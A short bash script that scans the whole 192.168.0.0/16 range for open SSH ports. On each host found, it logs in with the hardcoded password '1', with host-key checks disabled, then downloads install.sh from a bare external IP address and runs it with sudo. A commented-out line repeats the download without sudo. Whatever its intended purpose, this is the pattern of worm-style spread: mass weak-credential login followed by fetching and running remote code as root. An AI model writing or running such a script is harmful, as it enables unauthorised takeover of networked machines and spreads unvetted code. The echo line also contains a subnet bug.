#!/bin/bash

 for m in {1..254..1}
 	do
     for i in {1..254..1}
        do
          if nc -w 1 -zv 192.168.$m.$i 22 &>> /dev/null
          then
            echo "Processing 192.168.2.$i"
           sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.$m.$i "cd /usr/bin/ && sudo wget -O install.sh http://95.217.211.87:8000/install.sh && sudo chmod +x install.sh && sudo ./install.sh"
          fi
     done
done

#sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.2.$i "mkdir -p  /home/user/tmp && cd /home/user/tmp && wget -O install.sh http://95.217.211.87:8000/install.sh && chmod +x install.sh"

